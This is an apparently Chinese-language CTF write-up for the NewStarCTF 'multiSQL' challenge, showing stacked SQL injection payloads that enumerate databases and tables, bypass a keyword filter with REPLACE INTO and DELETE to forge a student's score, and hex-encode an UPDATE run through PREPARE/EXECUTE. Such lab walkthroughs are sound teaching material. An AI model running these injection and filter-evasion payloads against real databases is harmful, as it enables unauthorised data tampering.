#Week3 multiSQL 200



### 0、知识点与工具

>   sql注入

>   堆叠注入





### 1、分析页面

>   首先整个网页有俩个页面，分别是index.php与verify.php，
>
>   主页那边需要一个传入一个参数，然后下面就会显示分数

>   首先使用万能钥匙查询一下
>
>   ```
>   admin' or '1'='1
>   ```
>
>   

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105036.png)

>   发现整个表中好像只要一位同学有成绩

>   这时可以想起题目页面有提示信息，提示信息为堆叠注入，那么我们就阔以获取一些信息

### 2、注入

>   首先爆库
>
>   ```
>   1';show databases;
>   ```
>
>   

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105549.png)

>   在看一下English的表
>
>   ```
>   1';show tables from english;
>   ```
>
>   

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105731.png)

>   再接着爆字段
>
>   ```
>   1';show columns from score;
>   ```
>
>   

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120110049.png)

### 3、更改数据

>   再回想起题目的另一个提示，update的更改，那么flag一个是在verify页面中，然后咋们要让成绩总分大于425分

>   然后使用堆叠注入修改成绩会发现存在过滤，过滤了update
>
>   ```
>   1';update english set listen=100 where username='火华';
>   ```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211201220894.png)

>   后面继续测试会发现，还过滤了：**select、insert、union**

>   虽然过滤insert，但是insert有替换的关键字 -> replace
>
>   那么就阔以使用replace插入一条总分超过425分的数据，然后把原来的那一条数据给删除掉
>
>   ```java
>   1';replace into score values("火华",2000,200,200);#
>   1';delete from score where listen=11;#
>   
>   ```
>
>   然后点击验证成绩就可以获得flag



![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120123253.png)

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120123143.png)

>    flag{Ju3t_use_mo2e_t2en_0ne_SQL}

### 4、扩展

使用十六进制替换成绩

```
username=1';set @a=update score set listen = 1000 where username = '火华';prepare b from @a;execute b;#
转十六进制后
username=1';set @a = 0x7570646174652073636f726520736574206c697374656e203d2031303020776865726520757365726e616d65203d2027e781abe58d8e273b;prepare b from @a;execute b;#

```

